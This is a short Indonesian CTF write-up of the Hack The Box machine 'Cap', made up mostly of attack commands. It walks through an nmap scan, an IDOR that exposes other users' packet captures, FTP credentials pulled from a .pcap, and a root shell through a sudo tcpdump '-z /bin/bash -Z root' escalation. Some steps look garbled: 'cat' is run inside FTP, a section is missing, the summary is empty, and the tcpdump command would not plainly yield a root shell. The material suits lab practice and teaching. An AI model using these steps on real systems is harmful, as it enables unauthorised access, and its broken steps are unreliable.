# HTB Machines - Cap (Writeup)

**Platform:** Hack The Box - Machine 
**Difficulty:** Easy 
**Operating System:** Linux

---

# Ringkasan

---

# Tools yang Digunakan
- Nmap
- Wireshark
- FTP
- Bash

---
# Informasi Target
**Nama Mesin:** Cap
**IP Target:** 10.129.2.204

---

# 1. Reconnaissance (Scanning)

Pertama lakukan scanning untuk mengetahui port yang terbuka.

```bash
nmap -sC -sV 10.129.2.204
```
Hasil scan :
```bash
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
*artinya terdapat FTP,SSH, dan Web server.*

# 2. Web Enumeration

Buka website di browser :
```
http://10.129.2.204
```
Website ini menampilkan *dashboard security capture* yang berisi file **.pcap**.

Contoh url :
```
/data/0
/data/1
/data/2
```
Jika mengubah angka secara manual, kita bisa mengakses capture milik user lain.

Ini adalah **IDOR (Insecure Direct Object Reference)**.

# 3. Capture Credentials

Download file **.pcap**.
```
wget http://10.129.2.204/data/0
```
Buka dengan **Wireshark**.

Cari Traffic **FTP login**.

Didapatkan credential :
```
username: nathan
password: p4ssw0rd
```
# 4. FTP Access

Login menggunakan FTP.
```
ftp 10.129.2.204
```
Masukkan credential.
```
Name: nathan
Password: p4ssw0rd
```
Masuk ke folder user dan ambil flag.
```
cat user.txt
```

# Privilege Escalation

Cek kemampuan sudo.
```
sudo -l
```
Ditemukan bahwa user dapat menjalankan **tcpdump**.

Exploit tcpdump untuk mendapatkan shell.
```
sudo tcpdump -i lo -w /dev/null -W 1 -G 1 -z /bin/bash -Z root
```
Shell root berhasil didapatkan.

# 6. Root Flag
```
cd /root
cat root.txt
```
Root flag berhasil didapatkan.

# 7. Attack Path Summary

- Nmap scan menemukan FTP, SSH, HTTP
- Website memiliki IDOR vulnerability
- Download .pcap file
- Extract FTP credential dari Wireshark
- Login FTP sebagai user
- Privilege escalation via tcpdump sudo misconfiguration

# 8. Lessons Learned

- IDOR dapat menyebabkan kebocoran data sensitif
- Network capture dapat berisi credential plaintext
- Misconfigured sudo binary dapat memberikan privilege escalation
